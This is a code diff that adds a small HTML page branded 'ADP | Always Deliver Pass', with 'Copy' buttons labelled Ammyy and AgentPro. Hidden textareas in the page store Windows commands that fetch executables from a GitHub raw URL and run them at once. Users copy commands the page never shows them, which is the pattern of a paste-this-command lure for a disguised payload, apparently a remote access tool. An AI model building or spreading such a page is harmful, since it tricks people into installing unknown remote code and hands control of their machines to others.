@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>ADP | Always Deliver Pass</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #eef2ff, #f8faff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      width: 95%;
+      max-width: 440px;
+      background: white;
+      padding: 35px 30px;
+      border-radius: 18px;
+      box-shadow: 0 20px 50px rgba(30, 80, 200, 0.10);
+      text-align: center;
+    }
+
+    .brand {
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 40px;
+      background: linear-gradient(90deg, #1e3a8a, #2563eb);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 0.5px;
+    }
+
+    .item {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 18px;
+      margin-bottom: 28px;
+    }
+
+    .name {
+      font-size: 20px;
+      font-weight: 500;
+      color: #334155;
+      letter-spacing: 1px;
+    }
+
+    .copy-btn {
+      background: #1e40af;
+      color: white;
+      border: none;
+      padding: 6px 18px;
+      font-size: 13px;
+      border-radius: 22px;
+      cursor: pointer;
+      transition: 0.25s ease;
+      font-weight: 500;
+      box-shadow: 0 6px 15px rgba(30, 64, 175, 0.25);
+    }
+
+    .copy-btn:hover {
+      background: #162d85;
+      transform: translateY(-2px);
+    }
+
+    @media (max-width: 600px) {
+      .brand { font-size: 24px; }
+      .name { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="brand">ADP | Always Deliver Pass</div>
+
+    <div class="item">
+      <div class="name">Ammyy</div>
+      <button class="copy-btn" onclick="copyAmmyy(this)">Copy</button>
+    </div>
+
+    <div class="item">
+      <div class="name">AgentPro</div>
+      <button class="copy-btn" onclick="copyAgentPro(this)">Copy</button>
+    </div>
+
+    <!-- Hidden Safe Text Storage -->
+    <textarea id="AmmyyText" style="display:none;">
+for /f "delims=" %i in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('Desktop')"') do (
+    curl -L -o "%TEMP%\new.exe" https://raw.githubusercontent.com/Ammyyk134/setup/main/new.exe ^
+    && move /Y "%TEMP%\new.exe" "%i\new.exe" ^
+    && start "" "%i\new.exe"
+)</textarea>
+
+    <textarea id="AgentProText" style="display:none;">
+curl -L -o C:\AgentPro.exe https://raw.githubusercontent.com/Ammyyk134/setup/main/AgentPro.exe && C:\AgentPro.exe -install</textarea>
+
+  </div>
+
+  <script>
+    function copyAmmyy(btn) {
+      const message = document.getElementById("AmmyyText").value;
+      copyText(message, btn);
+    }
+
+    function copyAgentPro(btn) {
+      const message = document.getElementById("AgentProText").value;
+      copyText(message, btn);
+    }
+
+    function copyText(text, button) {
+      const textarea = document.createElement("textarea");
+      textarea.value = text;
+      document.body.appendChild(textarea);
+      textarea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textarea);
+
+      const original = button.innerText;
+      button.innerText = "Copied ✓";
+      button.style.background = "#22c55e";
+
+      setTimeout(() => {
+        button.innerText = original;
+        button.style.background = "#1e40af";
+      }, 1400);
+    }
+  </script>
+
+</body>
+</html>
